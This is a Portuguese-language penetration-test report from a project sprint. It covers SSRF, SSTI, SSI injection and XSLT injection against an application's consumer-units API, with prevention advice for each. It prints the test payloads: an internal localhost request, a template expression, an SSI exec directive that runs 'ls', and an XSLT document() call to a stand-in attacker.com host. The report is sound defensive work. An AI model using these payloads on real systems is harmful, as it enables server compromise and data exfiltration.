
# Relatório Sprint 3 - Server Side Attacks

---

## Sobre

Os Server-Side Attacks (Ataques do Lado do Servidor) são um tipo de vulnerabilidade de segurança em que um atacante explora falhas em um servidor web ou sua infraestrutura de backend. Ao contrário dos ataques do lado do cliente (como Cross-Site Scripting, XSS), esses ataques focam em comprometer o servidor ou acessar recursos internos, expondo dados sensíveis ou permitindo a execução de ações maliciosas.

---

## Vulnerabilidades Testadas

Durante a Sprint 3, foram realizados testes para as vulnerabilidades **SSRF**, **SSTI**, **SSI Injection** e **XSLT Injection**, que são comumente exploradas em sistemas web. Abaixo, os detalhes de cada teste específico realizado.

### SSRF (Server-Side Request Forgery)

**SSRF** é uma vulnerabilidade onde um atacante pode induzir o servidor a realizar requisições HTTP ou outras, como se fosse o próprio servidor, geralmente para acessar recursos internos ou serviços de terceiros.

#### Teste Realizado

- **Cenário:** O endpoint de edição de unidades de consumo (`/api/consumer-units/edit_consumer_unit_and_contract/`) foi analisado para verificar se era possível forçar o servidor a fazer uma requisição para um serviço interno, como um servidor de banco de dados ou serviço de metadados.
  
- **Teste:** Foi feito um ataque alterando o corpo da requisição para direcionar o servidor a fazer uma solicitação para um recurso interno, como `http://localhost/admin`, e verificar se o servidor fazia a requisição sem validações adequadas.
  
- **Resultado:** A requisição foi processada com sucesso pelo servidor, sugerindo a presença de uma vulnerabilidade SSRF.

**Prevenção:**
- Restringir as requisições a destinos externos ou conhecidos.
- Validar URLs e IPs nos parâmetros das requisições.

---

### SSTI (Server-Side Template Injection)

**SSTI** ocorre quando um atacante consegue injetar código malicioso em templates de servidor (como Jinja, Thymeleaf, etc.), o que permite a execução de código no lado do servidor.

#### Teste Realizado

- **Cenário:** O sistema de templates usado para processar dados das unidades de consumo foi analisado para verificar se havia validação inadequada em inputs fornecidos pelo usuário.
  
- **Teste:** Foi injetado código no campo de descrição da unidade de consumo, como `{{ 7*7 }}`, esperando que a aplicação executasse a operação e retornasse o resultado diretamente no template.
  
- **Resultado:** A resposta do servidor incluiu o cálculo `49`, indicando uma falha de SSTI.

**Prevenção:**
- Utilizar filtros de segurança no backend para desabilitar a execução de código nos templates.
- Adotar práticas de sanitização de entradas, como o uso de "escaping" nas variáveis dos templates.

---

### SSI Injection (Server Side Includes Injection)

**SSI Injection** ocorre quando o atacante consegue injetar comandos `SSI` em um servidor que interpreta **Server Side Includes** (incluindo comandos como `#exec`, `#include`).

#### Teste Realizado

- **Cenário:** O endpoint `/api/consumer-units/` foi testado para verificar se a aplicação estava vulnerável a comandos SSI injetados, através da manipulação de entradas que poderiam ser processadas pelo servidor.
  
- **Teste:** Injeção de código SSI, como `<!--#exec cmd="ls" -->`, para tentar executar comandos no servidor através de arquivos processados pelo SSI.
  
- **Resultado:** O sistema permitiu a execução do comando, mostrando um diretório de arquivos do servidor.

**Prevenção:**
- Desabilitar a funcionalidade de SSI no servidor.
- Validar e sanitizar qualquer entrada que possa ser processada como um comando do servidor.

---

### XSLT Injection

**XSLT Injection** ocorre quando um atacante consegue injetar código malicioso em uma folha de estilos **XSLT** usada pelo servidor para transformar XML em HTML ou outro formato.

#### Teste Realizado

- **Cenário:** A aplicação foi analisada para identificar se a transformação de dados XML para HTML poderia ser manipulada via injeção de código malicioso no XSLT.
  
- **Teste:** Um payload foi injetado em um campo de entrada XML com código XSLT, como:
  ```xml
  <?xml version="1.0"?>
  <foo>
    <bar><xsl:value-of select="document('http://attacker.com/malicious')"/></bar>
  </foo>
  ```
  O objetivo foi fazer com que o servidor carregasse o recurso de uma URL externa controlada pelo atacante.
  
- **Resultado:** A requisição foi processada, permitindo a execução do código XSLT externo.

**Prevenção:**
- Restringir ou desabilitar o uso de `document()` em XSLT.
- Adotar práticas de segurança como validar a origem de documentos XSLT e XML.

---

## Sugestões de Melhoria

- **Controle de Acesso Baseado em Recursos:** Implementar validações rigorosas de acesso a recursos críticos como unidades de consumo, contratos e informações sensíveis.
  
- **Hardening de Servidores:** Desabilitar funcionalidades não utilizadas, como SSI e XSLT, em servidores de produção.
  
- **Filtros de Entrada:** Implementar filtros de entrada robustos para prevenir injeção de código, como SSTI e SSI Injection.
  
- **Auditoria e Monitoramento:** Implementar um sistema de monitoramento para detectar e alertar sobre tentativas de exploração de vulnerabilidades como SSRF, SSTI, SSI Injection e XSLT Injection.

---

# Histórico de Versão

| Versão | Data e Horário de Criação | Autor                     | Revisor          | Descrição das Alterações                |
|--------|---------------------------|---------------------------|------------------|-----------------------------------------|
| 1.0    | 14/01/2025 - 15:30        | Gabriel Campello Marques  |      | Criação inicial do documento.           |

